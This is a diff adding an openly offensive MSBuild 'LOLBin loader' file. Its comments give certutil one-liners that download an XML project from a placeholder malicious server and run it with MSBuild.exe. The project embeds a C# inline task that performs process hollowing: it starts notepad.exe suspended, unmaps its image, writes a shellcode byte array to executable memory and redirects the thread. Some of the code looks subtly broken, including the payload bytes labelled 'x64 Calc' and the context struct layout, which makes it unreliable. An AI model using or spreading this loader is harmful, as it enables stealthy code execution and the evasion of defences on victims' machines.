@@ -1,0 +1,106 @@
+// The LOLBin Loader: MSBuild Execution
+// Leverages the native Windows binary MSBuild.exe to execute an XML project file containing an inline malicious C# task that performs process hollowing.
+
+// cmd.exe /c "certutil.exe -urlcache -split -f #{server.malicious.url}/hollow.xml %TEMP%\hollow.xml && C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %TEMP%\hollow.xml"
+//cmd.exe /c "certutil.exe -urlcache -split -f #{server.malicious.url} %TEMP%\hollow.xml && C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %TEMP%\hollow.xml && certutil.exe -urlcache -f -split #{server.malicious.url} delete"
+
+// certutil.exe -urlcache -split -f: Uses certutil.exe, a native certificate utility (LOLBin), to securely download the XML file containing the attack logic and save it to the TEMP directory.
+//&&: Chaining operator to ensure the download completes before execution.
+//MSBuild.exe %TEMP%\hollow.xml: Executes the malicious XML file. The XML contains an InlineTask element with the C# hollowing code, which MSBuild compiles and runs without needing an explicit executable on disk.
+
+
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hollow">
+    <HollowingTask />
+  </Target>
+
+  <UsingTask
+    TaskName="HollowingTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class HollowingTask : Task, ITask
+        {
+            // --- 🟢 EMBEDDED PAYLOAD SECTION (x64 Calc) 🟢 ---
+            public byte[] payload = new byte[] { 
+                0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0,
+                0x48, 0x8d, 0x15, 0x07, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x05, 0x00, 0x00, 0x00, 0xff, 0x25,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x48, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0xff, 0xc8, 0x48, 0x31, 0xc0, 0xc3
+            };
+
+            // --- Win32 API Definitions ---
+            [StructLayout(LayoutKind.Sequential)]
+            public struct STARTUPINFO { public uint cb; public string lpReserved, lpDesktop, lpTitle; public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
+            
+            [StructLayout(LayoutKind.Sequential)]
+            public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }
+
+            [StructLayout(LayoutKind.Sequential, Pack = 16)]
+            public struct CONTEXT64 {
+                public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
+                public uint ContextFlags;
+                public uint MxCsr;
+                public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
+                public uint EFlags;
+                public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
+                public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
+                public byte[] Header; 
+            }
+
+            [DllImport("kernel32.dll")]
+            public static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);
+            [DllImport("ntdll.dll")]
+            public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+            [DllImport("kernel32.dll")]
+            public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);
+            [DllImport("kernel32.dll")]
+            public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);
+            [DllImport("kernel32.dll")]
+            public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+            [DllImport("kernel32.dll")]
+            public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+            [DllImport("kernel32.dll")]
+            public static extern uint ResumeThread(IntPtr hThread);
+
+            public override bool Execute()
+            {
+                string target = "C:\\Windows\\System32\\notepad.exe";
+                STARTUPINFO si = new STARTUPINFO();
+                si.cb = (uint)Marshal.SizeOf(si);
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                // 1. Create Suspended
+                if (!CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) return false;
+
+                // 2. Hollow
+                IntPtr baseAddr = (IntPtr)0x400000;
+                NtUnmapViewOfSection(pi.hProcess, baseAddr);
+
+                // 3. Allocate and Write
+                IntPtr allocated = VirtualAllocEx(pi.hProcess, baseAddr, (uint)payload.Length, 0x3000, 0x40);
+                WriteProcessMemory(pi.hProcess, allocated, payload, (uint)payload.Length, out _);
+
+                // 4. Set Context & Resume
+                CONTEXT64 ctx = new CONTEXT64();
+                ctx.ContextFlags = 0x100001; 
+                GetThreadContext(pi.hThread, ref ctx);
+                ctx.Rip = (ulong)allocated;
+                SetThreadContext(pi.hThread, ref ctx);
+                ResumeThread(pi.hThread);
+
+                return true;
+            }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
